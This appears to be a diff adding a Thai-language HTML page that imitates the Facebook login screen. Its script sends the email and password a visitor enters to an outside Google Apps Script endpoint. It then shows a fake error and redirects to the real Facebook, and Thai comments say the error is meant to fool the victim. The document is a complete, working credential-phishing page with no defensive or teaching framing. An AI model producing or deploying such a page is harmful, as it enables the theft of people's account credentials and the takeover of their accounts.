@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
+    .container { width: 100%; max-width: 400px; margin: 80px auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 8px; }
+    h1 { color: #1877f2; text-align: center; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;
+    }
+    button {
+      width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 5px; margin-top: 10px;
+    }
+    p { font-size: 12px; color: #65676b; text-align: center; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>facebook</h1>
+  <form id="login-form">
+    <input type="text" id="email" placeholder="อีเมลหรือหมายเลขโทรศัพท์" required>
+    <input type="password" id="pass" placeholder="รหัสผ่าน" required>
+    <button type="submit">เข้าสู่ระบบ</button>
+    <p><a href="#">ลืมรหัสผ่านใช่ไหม?</a></p>
+  </form>
+</div>
+
+<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycbx0uwMhBvySzSOwuYYKPr11qU7Rjp6K3_YvW1Sg9FV2VMpQkARdIeUV9jBcq2Y_-MCB/exec';
+
+document.getElementById('login-form').addEventListener('submit', e => {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value;
+  const pass = document.getElementById('pass').value;
+  
+  fetch(scriptURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+  })
+  .then(response => {
+    alert('เกิดข้อผิดพลาด กรุณาลองใหม่ภายหลัง'); // หลอกคนว่า error
+    window.location.href = 'https://facebook.com'; // ส่งไปหน้าเฟสจริง
+  })
+  .catch(error => console.error('Error!', error.message));
+});
+</script>
+
+</body>
+</html>
+dd
